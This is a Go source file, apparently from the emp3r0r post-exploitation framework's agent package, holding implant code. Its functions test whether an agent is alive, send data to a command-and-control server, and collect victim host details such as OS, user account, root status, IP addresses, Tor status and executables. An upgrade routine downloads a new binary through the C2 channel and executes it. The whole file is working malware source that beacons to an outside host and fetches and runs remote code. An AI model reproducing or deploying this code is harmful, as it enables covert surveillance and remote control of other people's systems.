package agent

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// is the agent alive?
// connect to emp3r0r_data.SocketName, send a message, see if we get a reply
func IsAgentAlive(c net.Conn) bool {
	log.Println("Testing if agent is alive...")
	defer c.Close()

	replyFromAgent := make(chan string, 1)
	reader := func(r io.Reader) {
		buf := make([]byte, 1024)
		for {
			n, err := r.Read(buf[:])
			if err != nil {
				return
			}
			replyFromAgent <- string(buf[0:n])
		}
	}

	// listen for reply from agent
	go reader(c)

	// send hello to agent
	for {
		_, err := c.Write([]byte(fmt.Sprintf("hello from %d", os.Getpid())))
		if err != nil {
			log.Print("write error:", err)
			break
		}
		if strings.Contains(<-replyFromAgent, "emp3r0r") {
			log.Println("Yes it's alive")
			return true
		}
		time.Sleep(1e9)
	}

	return false
}

// Send2CC send TunData to CC
func Send2CC(data *emp3r0r_data.MsgTunData) error {
	var out = json.NewEncoder(emp3r0r_data.H2Json)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// CollectSystemInfo build system info object
func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
	log.Println("Collecting system info for checking in")
	var info emp3r0r_data.AgentSystemInfo
	osinfo := GetOSInfo()
	info.GOOS = runtime.GOOS

	info.OS = fmt.Sprintf("%s %s %s (%s)", osinfo.Vendor, osinfo.Name, osinfo.Version, osinfo.Architecture)
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	RuntimeConfig.AgentTag = util.GetHostID(RuntimeConfig.AgentUUID)
	info.Tag = RuntimeConfig.AgentTag // use hostid
	info.Hostname = hostname
	info.Name = strings.Split(info.Tag, "-agent")[0]
	info.Version = emp3r0r_data.Version
	info.Kernel = osinfo.Kernel
	info.Arch = osinfo.Architecture
	info.CPU = util.GetCPUInfo()
	info.GPU = util.GetGPUInfo()
	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
	info.Hardware = util.CheckProduct()
	info.Container = CheckContainer()
	setC2Transport()
	info.Transport = emp3r0r_data.Transport

	// have root?
	info.HasRoot = HasRoot()

	// process
	info.Process = CheckAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		log.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = tun.IsTor(emp3r0r_data.CCAddress)

	// has internet?
	info.HasInternet = tun.HasInternetAccess()

	// IP address?
	info.IPs = tun.IPa()

	// arp -a ?
	info.ARP = nil

	// exes in PATH
	info.Exes = util.ScanPATH()

	return &info
}

func Upgrade(checksum string) error {
	tempfile := RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
	_, err := DownloadViaCC("agent", tempfile)
	if err != nil {
		return fmt.Errorf("Download agent: %v", err)
	}
	download_checksum := tun.SHA256SumFile(tempfile)
	if checksum != download_checksum {
		return fmt.Errorf("checksum mismatch: %s expected, got %s", checksum, download_checksum)
	}
	err = os.Chmod(tempfile, 0755)
	if err != nil {
		return fmt.Errorf("chmod %s: %v", tempfile, err)
	}
	return exec.Command(tempfile, "-replace").Start()
}
